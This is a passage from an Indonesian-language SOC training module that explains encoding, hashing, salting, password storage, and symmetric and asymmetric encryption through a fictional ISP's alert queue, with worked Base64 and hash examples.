---
day: 05
title: 'Kriptografi dasar: encoding, hash, salt, enkripsi, digital signature, sertifikat, PKI, dan TLS'
researched_on: 2026-10-21
versions_checked: 'RFC 4648 (Base64, Okt 2006); RFC 7617 (HTTP Basic, Sep 2015); FIPS 180-4 (Secure Hash Standard, Agu 2015); RFC 1321 (MD5); RFC 6151 (Mar 2011); NIST SHA-1 retirement (Des 2022); NIST SP 800-63B-4 (Jul 2025); FIPS 197 (AES, pembaruan Mei 2023); RFC 5280 (X.509, Mei 2008); RFC 8446 (TLS 1.3, Agu 2018); RFC 8996 (Mar 2021); RFC 9849 (ECH, Mar 2026); CA/Browser Forum Ballot SC-081v3 (Apr 2025); FIPS 203/204/205 (Agu 2024); NIST CSRC Glossary; OWASP Password Storage Cheat Sheet; PowerShell 7.6 docs; MITRE ATT&CK T1027.010 v2.0'
---

# Day 05: Kriptografi dasar (encoding, hash, salt, enkripsi, digital signature, sertifikat, PKI, dan TLS)

Cakupan: istilah kriptografi yang paling sering muncul di pekerjaan SOC, yaitu beda encoding, hashing, dan encryption; hash MD5, SHA-1, SHA-256 dan collision; salting untuk penyimpanan password; symmetric dan asymmetric encryption beserta public key dan private key; digital signature; certificate, CA, dan PKI; key exchange; serta TLS, handshake-nya, dan HTTPS, semuanya di level fondasi tanpa matematika.

## Ide inti

Tiga kata yang sering dicampur di percakapan sehari-hari sebenarnya menjawab tiga pertanyaan berbeda. Encoding menjawab "bagaimana data ini diubah bentuknya supaya bisa dikirim atau disimpan?", dan siapa pun bisa membalikkannya tanpa rahasia apa pun. Hashing menjawab "apakah data ini masih sama persis?", dengan membuat sidik jari pendek yang tidak bisa dibalik menjadi data aslinya. Encryption menjawab "bagaimana supaya hanya orang yang berhak yang bisa membaca?", dengan mengacak data memakai kunci, dan hanya pemegang kunci yang bisa membukanya. Hampir semua kesalahan pemahaman di kriptografi dasar berawal dari menukar ketiganya: menganggap base64 sebagai enkripsi, menyimpan password dengan enkripsi padahal seharusnya di-hash, atau menganggap hash bisa "didekripsi".

Sisa istilah di Day ini dibangun di atas tiga alat itu. Asymmetric encryption memberi setiap pihak sepasang kunci: satu dibagikan, satu dirahasiakan. Pasangan kunci itu, digabung dengan hash, menghasilkan digital signature, yaitu bukti siapa yang membuat sebuah data dan bahwa data itu tidak berubah. Certificate adalah dokumen yang ditandatangani pihak tepercaya (CA) untuk menyatakan "public key ini milik nama ini", dan PKI adalah seluruh sistem yang menerbitkan, memeriksa, dan mencabut sertifikat. TLS memakai semuanya sekaligus: sertifikat untuk membuktikan identitas server, key exchange untuk menyepakati kunci rahasia, symmetric encryption untuk mengacak data, dan hash untuk memastikan tidak ada yang diubah di jalan. HTTPS adalah web yang berjalan di dalam TLS.

Bayangkan urusan surat-menyurat di kantor. Menulis ulang surat dengan kode Morse adalah encoding: siapa pun yang punya tabel Morse bisa membacanya. Sidik jari di dokumen adalah hash: cukup untuk mencocokkan apakah dokumennya sama, tetapi dari sidik jari kamu tidak bisa membuat ulang dokumennya. Surat bersandi yang hanya bisa dibuka penerima adalah encryption. Tanda tangan dan stempel di surat adalah digital signature. KTP yang diterbitkan Dukcapil adalah certificate, dan Dukcapil adalah CA-nya. Batas analogi ini: di dunia digital, "sidik jari" bisa dicari ulang dengan menebak isi dokumen bila isinya pendek dan mudah ditebak, dan "KTP" server hanya membuktikan nama domain, bukan bahwa pemiliknya orang baik.

```
                     butuh kunci?   bisa dibalik?   tujuan
  ENCODING           tidak          ya, oleh siapa pun        mengubah format (base64)
  HASHING            tidak          tidak                     sidik jari, cek keutuhan (SHA-256)
  ENCRYPTION         ya             ya, hanya pemegang kunci   kerahasiaan (AES, TLS)

  hash + private key            = DIGITAL SIGNATURE   (siapa pembuatnya, apakah berubah)
  public key + nama + tanda CA  = CERTIFICATE         (public key ini milik siapa)
  CA + aturan + daftar dipercaya = PKI
  certificate + key exchange + symmetric encryption + hash = TLS ; HTTP di dalam TLS = HTTPS
```

Situasi yang dipakai sepanjang Day ini terjadi di PT Jaringan Anak Bangsa (PT JAB), ISP fiktif dengan sekitar 1.200 karyawan dan sekitar 400 ribu pelanggan internet rumah. Kamu adalah analyst L1 (lapis pertama yang memeriksa alert) yang baru bergabung di SOC (Security Operations Center, tim yang memantau keamanan perusahaan) PT JAB. Jumat 2027-08-06, hari kelima orientasi, pukul 08:45, mentormu Sari Kusuma (analyst L2) membuka tiga hal di layar. Pertama, alert `SOC-2027-0830` dari EDR (agen pengawas di laptop dan server) di laptop `JKT-WS-1052`: PowerShell, alat baris perintah bawaan Windows, dijalankan dengan deretan huruf panjang yang tampak acak, dan catatan awal di tiket dari Gilang Ramadhan (analyst L1) berbunyi "argumen terenkripsi, isi tidak bisa dibaca, kemungkinan skrip IT resmi". Kedua, alert `SOC-2027-0831` dari laptop yang sama, berisi satu nilai hash SHA-256 sebuah file. Ketiga, alert `SOC-2027-0832`: sertifikat situs portal pelanggan `portal.jab.example` akan kedaluwarsa dalam 14 hari. Di tangannya juga ada email dari tim aplikasi portal. Sari berkata:

> "Hari ini semuanya soal kriptografi, dan semuanya muncul di antrean kita minggu ini. Gilang menulis argumen PowerShell itu 'terenkripsi'. Benarkah, atau kita sebenarnya bisa membacanya? Alert kedua cuma memberi deretan 64 karakter. Itu apa, kenapa panjangnya 64, kenapa EDR juga mencatat MD5 dan SHA-1 tapi kita pakai SHA-256, dan apa yang bisa kita simpulkan kalau hash itu tidak dikenal di layanan reputasi? Tim aplikasi bertanya: password pelanggan portal sekarang disimpan terenkripsi AES dengan kunci di file konfigurasi; cukup, atau harus di-hash? Lalu pertanyaan klasik: browser pelanggan dan portal belum pernah bertemu, bagaimana mereka bisa sepakat kunci rahasia lewat internet yang bisa disadap? Di hari pertama kita membahas pelanggan yang menyangkal mengganti paketnya; bukti apa yang lebih kuat daripada log? Soal sertifikat: sebenarnya sertifikat itu apa, siapa yang menerbitkan, kenapa browser memercayainya, dan kenapa sekarang cepat sekali kedaluwarsa? Terakhir, ceritakan apa yang terjadi saat pelanggan membuka portal, dan apa yang terjadi kalau 14 hari lagi sertifikatnya benar-benar habis."

Pesan itu memuat tujuh pertanyaan:

1. Apakah deretan huruf di perintah PowerShell itu terenkripsi, atau bisa dibaca?
2. Apa itu hash SHA-256, kenapa 64 karakter, kenapa bukan MD5 atau SHA-1, dan apa artinya bila hash tidak dikenal?
3. Password pelanggan sebaiknya dienkripsi atau di-hash, dan bagaimana caranya?
4. Bagaimana browser dan portal bisa sepakat kunci rahasia tanpa pernah bertemu?
5. Bukti apa yang lebih kuat daripada log untuk melawan penyangkalan?
6. Apa itu sertifikat, siapa penerbitnya, kenapa dipercaya, dan kenapa masa berlakunya makin pendek?
7. Apa yang terjadi saat pelanggan membuka portal lewat HTTPS, dan apa akibatnya bila sertifikat kedaluwarsa?

Pertanyaan 1 dijawab di bagian 1.1, pertanyaan 2 di bagian 1.2, pertanyaan 3 di bagian 1.3, pertanyaan 4 di bagian 1.4 dan 1.8, pertanyaan 5 di bagian 1.5, pertanyaan 6 di bagian 1.6 dan 1.7, dan pertanyaan 7 di bagian 1.9 dan 1.10. Bagian 2 membedah ketiga alert dan email tim aplikasi secara utuh.

**Kapan relevan:** setiap kali alert memuat string yang tampak acak (base64, hash), saat mencocokkan file dengan layanan reputasi, saat menilai cara aplikasi menyimpan password, saat menangani peringatan sertifikat atau keluhan "situs tidak aman" dari user, saat membaca apa yang terlihat dan tidak terlihat di lalu lintas HTTPS, dan saat menjawab pertanyaan interview tentang perbedaan encoding, hashing, dan encryption.
**Kapan bukan jawaban:** Day ini tidak mengajarkan cara memilih atau mengonfigurasi algoritma untuk sistem produksi, cara memecahkan sandi, atau matematika di baliknya. Kriptografi juga bukan jawaban untuk semua masalah: data yang terenkripsi sempurna tetap bocor bila kuncinya dicuri, akun dibobol, atau user tertipu menyerahkan password.

## 1. Konsep inti

### 1.0 Istilah di Day ini

Istilah dari Day 01 (CIA triad, non-repudiation, control) dan Day 02 (paket, port, HTTP, HTTPS, SNI) tidak diulang di tabel ini; definisinya diulang satu kalimat di tempat yang memerlukannya. Tabel berikut memuat semua istilah kriptografi yang dipakai Day ini; cari kolom ketiga bila sebuah istilah terasa abstrak.

| Istilah | Arti singkat | Padanan sehari-hari |
|---|---|---|
| Kriptografi | Ilmu dan teknik melindungi informasi dengan mengubah bentuknya memakai aturan matematis | Seni membuat dan membaca surat bersandi |
| Plaintext / ciphertext | Data asli yang bisa dibaca / data yang sudah diacak | Surat biasa / surat bersandi |
| Encoding | Mengubah format data dengan aturan publik, bisa dibalik siapa pun | Menulis ulang surat dengan kode Morse |
| Base64 | Encoding yang mengubah data apa pun menjadi 64 karakter teks aman | Tabel Morse yang dipakai semua orang |
| Hash function | Fungsi yang mengubah data sepanjang apa pun menjadi sidik jari pendek dengan panjang tetap | Sidik jari dokumen |
| Hash (digest) | Hasil hash function, biasanya ditulis heksadesimal | Hasil cap sidik jari |
| MD5, SHA-1, SHA-256 | Tiga hash function populer; dua yang pertama sudah rusak untuk keamanan | Tiga generasi alat pengambil sidik jari |
| Collision | Dua data berbeda yang menghasilkan hash yang sama | Dua orang berbeda dengan sidik jari kembar |
| Salt | Nilai acak unik per user yang digabung dengan password sebelum di-hash | Taburan garam dengan takaran berbeda di setiap piring |
| Password hashing scheme | Cara hash khusus password yang sengaja lambat dan memakai salt | Brankas yang sengaja lama dibuka supaya maling kehabisan waktu |
| Encryption / decryption | Mengacak data memakai kunci / membukanya kembali | Mengunci surat ke dalam kotak / membuka kotaknya |
| Key (kunci) | Nilai rahasia yang mengendalikan enkripsi dan dekripsi | Anak kunci |
| Symmetric encryption | Satu kunci yang sama untuk mengunci dan membuka | Kunci rumah yang duplikatnya dipegang penghuni lain |
| Asymmetric encryption | Sepasang kunci berbeda: public key dan private key | Gembok terbuka yang dibagikan, anak kuncinya dipegang pemilik |
| Public key / private key | Kunci yang boleh dibagikan / kunci yang wajib dirahasiakan pemiliknya | Gembok terbuka / anak kunci gembok |
| AES | Standar symmetric encryption yang paling banyak dipakai | Merek gembok yang sudah diuji badan standar |
| Digital signature | Bukti kriptografis siapa pembuat data dan bahwa data tidak berubah | Tanda tangan dan stempel di surat resmi |
| Certificate | Dokumen digital bertanda tangan CA yang mengikat public key ke sebuah nama | KTP server |
| CA (certificate authority) | Pihak tepercaya yang menerbitkan dan mencabut sertifikat | Dukcapil yang menerbitkan KTP |
| PKI | Seluruh sistem (aturan, orang, server) untuk menerbitkan, mengelola, dan mencabut sertifikat | Sistem administrasi kependudukan |
| Root CA / intermediate CA | CA paling atas yang dipercaya langsung / CA perantara di bawahnya | Kementerian / kantor cabang Dukcapil |
| Trust store | Daftar root CA yang dipercaya sistem operasi atau browser | Daftar instansi penerbit KTP yang diakui |
| Revocation | Pencabutan sertifikat sebelum masa berlakunya habis | Pemblokiran KTP yang hilang |
| Key exchange | Cara dua pihak menyepakati kunci rahasia lewat jalur terbuka | Mencampur cat sehingga dua orang mendapat warna rahasia yang sama |
| Session key | Kunci symmetric sementara untuk satu sambungan | Kunci loker yang dipakai sekali lalu dibuang |
| Forward secrecy | Kebocoran private key server di kemudian hari tidak membuka rekaman sambungan lama | Kunci loker lama sudah dibuang, jadi tidak bisa dipakai membuka loker kemarin |
| TLS | Protokol yang mengamankan sambungan: identitas server, kerahasiaan, keutuhan | Perkenalan resmi di telepon, lalu bicara dengan bahasa sandi |
| Handshake TLS | Tahap pembuka TLS untuk saling kenal dan menyepakati kunci | Saling tunjuk KTP dan sepakat kode sandi sebelum bicara |
| Cipher suite | Paket algoritma yang dipakai sebuah sambungan TLS | Paket aturan sandi yang disepakati |

### 1.1 Encoding, hashing, dan encryption

Pertanyaan pertama Sari berawal dari catatan Gilang: argumen PowerShell di alert `SOC-2027-0830` disebut "terenkripsi". Untuk menilainya, kamu harus bisa membedakan tiga cara mengubah data yang hasilnya sama-sama terlihat acak.

**Apa itu:**
- **Encoding** adalah mengubah format data dengan aturan yang dipublikasikan, supaya data bisa dikirim atau disimpan oleh sistem yang hanya menerima jenis karakter tertentu. Tidak ada kunci dan tidak ada rahasia; siapa pun yang tahu nama encoding-nya bisa membalikkannya. Contoh paling umum adalah Base64, yang mengubah data apa pun menjadi teks dari 64 karakter: huruf besar A sampai Z, huruf kecil a sampai z, angka 0 sampai 9, tanda `+` dan `/`, ditambah `=` sebagai pengisi di akhir [S1]. Standar Base64 sendiri menegaskan bahwa encoding ini tidak memberi kerahasiaan apa pun; ia hanya menyamarkan tampilan data seperti password, dan kesalahpahaman ini pernah menimbulkan insiden nyata [S1].
- **Hashing** adalah mengubah data sepanjang apa pun menjadi keluaran pendek dengan panjang tetap, disebut hash atau digest [S5]. Hash tidak bisa dibalik menjadi data aslinya. Fungsinya mirip sidik jari: dipakai untuk mengenali dan mencocokkan data (bagian 1.2).
- **Encryption** (enkripsi) adalah mengacak data (plaintext) menjadi ciphertext memakai algoritma dan kunci, sehingga hanya pemegang kunci yang tepat yang bisa mengembalikannya (decryption). Kerahasiaannya bergantung pada kunci, bukan pada rahasia algoritmanya: algoritma seperti AES dipublikasikan terbuka sebagai standar [S14].

**Analogi:** encoding seperti menulis ulang surat dengan kode Morse. Tampilannya aneh bagi orang awam, tetapi siapa pun yang punya tabel Morse (dan tabel itu dijual bebas) bisa membacanya. Hashing seperti mengambil sidik jari dokumen: cocok untuk membuktikan "dokumen ini sama dengan yang kemarin", tetapi sidik jari tidak bisa diubah kembali menjadi dokumennya. Encryption seperti memasukkan surat ke kotak bergembok: isinya utuh di dalam, tetapi hanya pemegang kunci yang bisa mengeluarkannya. Batasnya: encoding sering membuat orang awam merasa datanya "sudah aman" hanya karena tidak terbaca sekilas, padahal bagi alat apa pun ia sama terbukanya dengan teks biasa.

**Cara kerja:** Base64 bekerja per kelompok tiga byte. Tiga byte (24 bit) dipecah menjadi empat kelompok 6 bit, dan setiap kelompok 6 bit (nilai 0 sampai 63) diganti satu karakter dari tabel [S1]. Karena itu setiap tiga byte data menjadi empat karakter, dan hasil Base64 kira-kira sepertiga lebih panjang dari aslinya. Bila sisa data di akhir hanya satu byte, hasilnya dua karakter diikuti `==`; bila sisa dua byte, tiga karakter diikuti `=` [S1].

```
teks     : H        a        l        o
byte     : 01001000 01100001 01101100 01101111
kelompok : 010010 000110 000101 101100 | 011011 11(0000) = =
karakter : S      G      F      s      | b      w        = =
hasil    : SGFsbw==   (4 byte jadi 8 karakter: 4 untuk "Hal", 4 untuk "o" + pengisi)
```

Beberapa contoh lain, semuanya dihitung dengan perintah `base64`:

| Teks asli | Panjang (byte) | Base64 | Panjang hasil | Penjelasan pengisi |
|---|---|---|---|---|
| `jab` | 3 | `amFi` | 4 | Pas tiga byte, tanpa `=` |
| `Halo` | 4 | `SGFsbw==` | 8 | Sisa satu byte, dua `=` |
| `Halo!` | 5 | `SGFsbyE=` | 8 | Sisa dua byte, satu `=` |
| `admin:Rahasia123` | 16 | `YWRtaW46UmFoYXNpYTEyMw==` | 24 | Lima kelompok penuh (20 karakter) ditambah sisa satu byte (4 karakter) |

Baris terakhir bukan contoh iseng. Skema HTTP Basic authentication mengirim pasangan `username:password` dalam Base64 di header permintaan, dan standarnya sendiri menyebut password itu praktis terkirim sebagai teks terbuka, sehingga hanya layak dipakai di dalam TLS [S2]. Siapa pun yang menyadap header itu di jalur HTTP biasa bisa membalik Base64-nya dalam sedetik.

**Contoh di PT JAB:** PowerShell punya parameter `-EncodedCommand` yang menerima perintah dalam bentuk Base64; dokumentasinya menyebut parameter ini dibuat untuk perintah dengan tanda kutip bertingkat yang rumit, dan teks perintahnya harus di-encode sebagai UTF-16LE (cara Windows menyimpan teks dengan dua byte per huruf) sebelum diubah ke Base64 [S3]. Penyerang memakai fitur yang sama untuk menyembunyikan perintahnya dari mata manusia dan dari aturan deteksi sederhana; MITRE ATT&CK mencatat pola ini sebagai Command Obfuscation (T1027.010) dan menyebut Base64 sebagai salah satu cara yang paling umum [S4]. Jadi catatan Gilang keliru: argumen itu di-encode, bukan dienkripsi, dan analyst bisa membacanya tanpa kunci apa pun. Isinya dibuka di bagian 2.1.

**Beda encoding dengan encryption:** pertanyaan pengujinya sederhana: "Untuk membaliknya, apakah saya butuh sesuatu yang rahasia?" Bila tidak (cukup tahu namanya Base64, hex, URL encoding), itu encoding. Bila butuh kunci, itu encryption. Bila tidak bisa dibalik sama sekali, itu hashing.

**Salah paham umum:**
- "String yang berakhiran `=` pasti terenkripsi." Tanda `=` di akhir adalah pengisi Base64 [S1], justru petunjuk bahwa itu encoding. Ciphertext hasil enkripsi sering juga ditulis dalam Base64 supaya bisa dikirim sebagai teks, jadi `=` hanya memberi tahu formatnya, bukan apakah isinya terenkripsi. Cara memastikannya: decode, lalu lihat apakah hasilnya terbaca.

### 1.2 Hash: MD5, SHA-1, SHA-256, dan collision

Pertanyaan kedua Sari menyangkut alert `SOC-2027-0831`: EDR mengkarantina sebuah file di `JKT-WS-1052` dan mencatat tiga hash untuk file itu, yaitu MD5, SHA-1, dan SHA-256. Sari meminta kamu memakai yang SHA-256.

**Apa itu:** hash function adalah fungsi yang menerima data sepanjang apa pun dan mengeluarkan nilai dengan panjang tetap, yang sering berfungsi sebagai ringkasan padat data itu [S5]. Hash function yang dipakai untuk keamanan harus punya tiga sifat [S5][S6]:
- **One-way (preimage resistance):** dari sebuah hash, secara praktis mustahil menemukan data yang menghasilkannya.
- **Second preimage resistance:** dari satu data, secara praktis mustahil menemukan data lain dengan hash yang sama.
- **Collision resistance:** secara praktis mustahil menemukan dua data berbeda apa pun yang hash-nya sama.

Standar NIST FIPS 180-4 menambahkan satu sifat yang paling terasa di pekerjaan sehari-hari: perubahan apa pun pada data, sekecil apa pun, dengan peluang sangat tinggi menghasilkan hash yang berbeda [S6]. Collision adalah keadaan ketika dua data berbeda menghasilkan hash yang sama. Karena keluaran hash panjangnya tetap sedangkan masukannya tidak terbatas, collision pasti ada secara teori; hash yang baik membuat collision itu mustahil ditemukan dengan sengaja.

**Analogi:** sidik jari dokumen. Dua salinan dokumen yang identik punya sidik jari yang sama, dan dokumen yang diubah satu huruf punya sidik jari yang sama sekali lain. Dari sidik jari kamu tidak bisa membuat ulang dokumennya. Batasnya ada dua. Pertama, bila isi dokumen pendek dan mudah ditebak (misalnya password `Rahasia123`), penyerang bisa menebak isi, mengambil sidik jarinya, lalu mencocokkan; itu sebabnya password butuh perlakuan khusus (bagian 1.3). Kedua, alat sidik jari generasi lama bisa "dipalsukan": peneliti bisa sengaja membuat dua dokumen berbeda dengan sidik jari kembar, dan itulah yang terjadi pada MD5 dan SHA-1.

**Cara kerja:** hash ditulis dalam heksadesimal (angka 0 sampai 9 dan huruf a sampai f), dan setiap karakter heksadesimal mewakili 4 bit. Panjang hash dalam karakter karenanya sama dengan jumlah bitnya dibagi empat. Tabel berikut adalah tiga hash yang paling sering muncul di alert; cari kolom "Status untuk keamanan".

| Hash | Panjang keluaran | Karakter heksadesimal | Standar | Status untuk keamanan |
|---|---|---|---|---|
| MD5 | 128 bit | 32 | RFC 1321 (1992) [S7] | Rusak. Collision bisa dibuat dalam hitungan detik di PC biasa; tidak boleh dipakai untuk digital signature [S8] |
| SHA-1 | 160 bit | 40 | FIPS 180-4 [S6] | Rusak. Collision praktis pertama diumumkan 2017; NIST memensiunkannya [S9][S10] |
| SHA-256 | 256 bit | 64 | FIPS 180-4 [S6] | Aman untuk dipakai; anggota keluarga SHA-2 yang dianjurkan NIST sebagai pengganti SHA-1 [S10] |

Contoh berikut dihitung dengan `md5sum`, `sha1sum`, dan `sha256sum` dari teks `jab` (tiga huruf, tanpa baris baru). Perhatikan panjangnya: 32, 40, dan 64 karakter.

```
MD5     b40157c4e5f49e6490a237102344fea4                                  (32 karakter)
SHA-1   831c727e454a87ab26e0593d02aea1ea3f928608                          (40 karakter)
SHA-256 f1180a3705b59c9db9d8de89a63e2980b6d1c2c4de375c26e868b454cf1e964e  (64 karakter)
```

Sifat "perubahan kecil, hash berubah total" terlihat bila dua teks yang hanya beda satu angka di-hash dengan SHA-256:

```
"Tagihan Rp150.000"  7911107b5d3cb78b454c5cfefecdc908532db81fdd63055f1fae1f8a6968f0d0
"Tagihan Rp150.001"  8f9e602d52193f177195398f655de2351c72327634a23e3cd125fb7aa55f5563
```

Dua hash itu tidak punya kemiripan pola apa pun, walaupun teksnya hanya berbeda satu karakter. Itulah sebabnya hash cocok untuk memeriksa integrity (keutuhan, sifat I di CIA triad Day 01): bila hash file yang diunduh sama dengan hash yang diumumkan pembuatnya, file itu tidak berubah di jalan.

Kenapa MD5 dan SHA-1 disebut rusak padahal masih bisa menghasilkan hash? Yang rusak adalah collision resistance-nya. Untuk MD5, RFC 6151 mencatat collision bisa dibuat dalam kurang dari satu menit di komputer biasa, sehingga MD5 tidak boleh lagi dipakai untuk digital signature [S8]. Untuk SHA-1, peneliti CWI Amsterdam dan Google pada 23 Februari 2017 mengumumkan dua file PDF yang isinya terlihat berbeda tetapi hash SHA-1-nya sama persis; pekerjaannya setara sekitar 6.500 tahun CPU dan 110 tahun GPU [S9]. Penyerang yang bisa membuat collision bisa, misalnya, meminta tanda tangan untuk dokumen yang tidak berbahaya lalu memindahkan tanda tangan itu ke dokumen jahat yang hash-nya sama.

**Contoh di PT JAB:** EDR di PT JAB mencatat MD5, SHA-1, dan SHA-256 untuk setiap file, karena layanan reputasi dan laporan intelijen lama masih memakai MD5 atau SHA-1 sebagai identitas file. Untuk mengenali file, ketiganya masih berguna; menemukan file lain yang kebetulan punya MD5 sama tetap tidak mungkin terjadi tanpa sengaja. Tetapi untuk keputusan keamanan, misalnya allowlist file atau bukti di laporan insiden, SOC PT JAB memakai SHA-256, karena penyerang bisa sengaja membuat file jahat yang MD5-nya sama dengan file yang sudah di-allowlist. Pembacaan hash di alert `SOC-2027-0831` ada di bagian 2.2.

**Beda hash dengan encryption:** encryption bisa dibuka dengan kunci; hash tidak punya kunci dan tidak bisa dibuka. Frasa "mendekripsi hash" selalu keliru. Yang dilakukan penyerang terhadap hash password adalah menebak: mencoba banyak calon password, meng-hash masing-masing, lalu mencocokkan hasilnya.

**Beda hash dengan checksum biasa:** checksum seperti yang ada di header UDP (Day 02) dibuat untuk mendeteksi kerusakan tidak sengaja di jalan, dan mudah dipalsukan dengan sengaja. Hash kriptografis dirancang tahan terhadap pemalsuan yang disengaja.

**Salah paham umum:**
- "Hash file tidak dikenal di layanan reputasi berarti file itu aman." Hash hanya identitas. Hash yang belum pernah terlihat bisa berarti file itu baru dibuat khusus untuk satu sasaran, dan satu byte yang diubah penyerang sudah cukup untuk membuat hash baru. Pembahasan reputasi lebih lanjut ada di Day 12.

### 1.3 Salting dan penyimpanan password

Pertanyaan ketiga Sari datang dari email tim aplikasi portal: password pelanggan sekarang disimpan terenkripsi AES, dengan kunci di file konfigurasi server. Mereka bertanya apakah itu cukup.

**Apa itu:** salt adalah nilai yang tidak rahasia, dipakai dalam proses kriptografis supaya hasil perhitungan untuk satu kasus tidak bisa dipakai ulang penyerang untuk kasus lain [S12]. Untuk password, salt adalah nilai acak unik per akun yang digabung dengan password sebelum di-hash, lalu disimpan di samping hash-nya. NIST SP 800-63B-4 mewajibkan verifier (sistem yang memeriksa password) menyimpan password dalam bentuk salted dan hashed memakai password hashing scheme yang sesuai, dengan salt minimal 32 bit [S11]. Password hashing scheme adalah cara hash khusus password yang menerima tiga masukan: password, salt, dan cost factor, yaitu pengatur seberapa berat (lambat) perhitungannya [S11].

**Analogi:** taburan garam dengan takaran berbeda di setiap piring. Dua piring nasi goreng dari resep yang sama (password yang sama) tetap terasa berbeda karena garamnya berbeda, jadi orang tidak bisa menebak "dua piring ini resepnya sama" hanya dari rasanya. Batasnya: salt tidak rahasia dan disimpan terbuka di samping hash. Salt tidak membuat password lemah menjadi kuat; ia hanya memaksa penyerang menebak password setiap akun satu per satu, bukan sekaligus untuk semua akun.

**Cara kerja:** tanpa salt, password yang sama selalu menghasilkan hash yang sama. Penyerang yang mencuri database bisa langsung melihat akun mana yang memakai password sama, dan bisa memakai tabel hash yang dihitung sebelumnya (precomputed table, dikenal juga sebagai rainbow table) untuk ribuan password populer sekaligus. Dengan salt unik, password sama menghasilkan hash berbeda, dan tabel siap pakai itu tidak berguna [S13].

```
TANPA SALT (SHA-256 biasa)
  pelanggan A  password "Rahasia123"  0f9712c97aecd62bbbe33cc04acd86b6331c95499947871b14b157253704fa8c
  pelanggan B  password "Rahasia123"  0f9712c97aecd62bbbe33cc04acd86b6331c95499947871b14b157253704fa8c   <- sama, ketahuan

DENGAN SALT UNIK (salt digabung di depan password, lalu SHA-256)
  pelanggan A  salt q8Zt3LwA9xRm2c7K  c45c0f3ad92c85ef35c50f5e7ef18e6fa69e4c0118cfdd13f1467db8126e3148
  pelanggan B  salt Vb1nE5yHs0Jd4uPo  4e97a6a47e55c907e47e6f02f69e2cc4536403147c0ffd38484b21de92b76c0f   <- berbeda
```

Contoh di atas memakai SHA-256 biasa hanya supaya efek salt terlihat jelas. Untuk password sungguhan, SHA-256 biasa tidak cukup, walaupun diberi salt. SHA-256, SHA-1, dan MD5 dirancang secepat mungkin, dan kecepatan itu justru menguntungkan penyerang yang ingin mencoba miliaran tebakan [S13]. Karena itu password memakai scheme yang sengaja lambat dan bisa diatur beratnya. OWASP menganjurkan Argon2id sebagai pilihan utama, scrypt bila Argon2id tidak tersedia, bcrypt hanya untuk sistem lama, dan PBKDF2-HMAC-SHA256 dengan 600.000 iterasi bila organisasi wajib memakai algoritma yang disetujui FIPS [S13]. NIST juga menganjurkan agar setiap hash password menyimpan keterangan scheme dan cost factor yang dipakai, supaya kelak bisa dimigrasi ke yang lebih kuat [S11].

Ada satu lapisan tambahan yang sering muncul di diskusi: pepper, yaitu nilai rahasia yang sama untuk semua password, disimpan terpisah dari database (misalnya di brankas kunci). NIST menganjurkan verifier melakukan satu langkah hash berkunci tambahan dengan kunci yang disimpan terpisah [S11], dan OWASP menyebut pepper sebagai lapisan defense in depth yang tidak cukup bila berdiri sendiri [S13].

**Contoh di PT JAB:** password pelanggan portal yang dienkripsi AES punya satu kelemahan mendasar: enkripsi bisa dibuka. Bila penyerang mendapat database sekaligus file konfigurasi berisi kunci (keduanya ada di server yang sama), seluruh password pelanggan terbuka dalam bentuk aslinya, termasuk password yang dipakai ulang pelanggan di situs lain. OWASP menyebut enkripsi password hanya layak di kasus langka ketika password aslinya memang harus bisa dikembalikan [S13]; portal tidak punya kebutuhan itu, karena portal cukup memeriksa apakah password yang diketik pelanggan cocok. Jawaban lengkap untuk tim aplikasi ada di bagian 2.3.

**Beda salt dengan key:** key enkripsi wajib rahasia; bila bocor, semua data terbuka. Salt tidak rahasia dan boleh disimpan di kolom yang sama dengan hash. Yang membuat salt berguna adalah keunikannya, bukan kerahasiaannya.

**Salah paham umum:**
- "Password kami di-hash SHA-256 dengan salt, jadi sudah sesuai standar." Salt sudah benar, tetapi SHA-256 biasa terlalu cepat untuk password; yang diminta NIST adalah password hashing scheme dengan cost factor [S11].

### 1.4 Symmetric vs asymmetric encryption, public key dan private key

Pertanyaan keempat Sari berbunyi: browser pelanggan dan portal belum pernah bertemu, jadi bagaimana mereka bisa bicara rahasia? Jawabannya dimulai dari dua jenis enkripsi.

**Apa itu:**
- **Symmetric encryption** memakai satu kunci yang sama untuk mengenkripsi dan mendekripsi. Kedua pihak harus memegang kunci yang sama dan menjaganya tetap rahasia. Standar yang paling banyak dipakai adalah AES (Advanced Encryption Standard, FIPS 197), yang mengenkripsi data per blok 128 bit dengan kunci 128, 192, atau 256 bit; angka di nama AES-128, AES-192, dan AES-256 adalah panjang kuncinya [S14].
- **Asymmetric encryption** (disebut juga public key cryptography) memakai dua kunci berbeda yang berpasangan: satu kunci dipakai mengenkripsi atau menandatangani data, kunci pasangannya dipakai mendekripsi atau memverifikasi tanda tangan [S15]. Public key boleh dibagikan ke siapa pun. Private key wajib dirahasiakan pemiliknya dan tidak pernah dikirim ke mana pun. Contoh algoritmanya RSA dan kriptografi kurva eliptik (ECC).

**Analogi:** symmetric seperti kunci rumah: kunci yang sama mengunci dan membuka pintu, dan penghuni lain harus diberi duplikatnya. Masalahnya adalah cara memberikan duplikat itu ke orang di kota lain tanpa dicegat kurir. Asymmetric seperti gembok terbuka yang kamu bagikan sebanyak-banyaknya: siapa pun bisa memasukkan surat ke kotak dan mengunci dengan gembokmu (public key), tetapi hanya kamu yang memegang anak kuncinya (private key). Batasnya: orang yang menerima gembok tidak tahu apakah gembok itu benar-benar milikmu atau gembok penipu yang mengaku kamu. Masalah itulah yang diselesaikan certificate (bagian 1.6).

**Cara kerja:** kedua jenis punya kelebihan yang saling melengkapi, sehingga sistem nyata hampir selalu memakai keduanya.

```
SYMMETRIC                                   ASYMMETRIC
  [kunci K] mengunci                          public key penerima mengunci
  [kunci K] yang sama membuka                 private key penerima membuka
  cepat, cocok untuk data besar               lambat, cocok untuk data kecil (kunci, tanda tangan)
  masalah: bagaimana K sampai ke penerima?    masalah: apakah public key ini benar milik penerima?

SISTEM NYATA (mis. TLS): asymmetric dipakai untuk membuktikan identitas dan menyepakati
kunci, lalu symmetric dipakai untuk mengenkripsi seluruh data dengan kunci sesi itu.
```

Satu hal yang membedakan jenis ini dari analogi gembok: pada pasangan kunci asymmetric, arah pemakaiannya menentukan fungsinya. Mengunci dengan public key penerima menghasilkan kerahasiaan (hanya penerima yang bisa membuka). Menandatangani dengan private key milik sendiri menghasilkan bukti asal-usul (siapa pun bisa memeriksa dengan public key-mu). Arah kedua ini adalah digital signature (bagian 1.5).

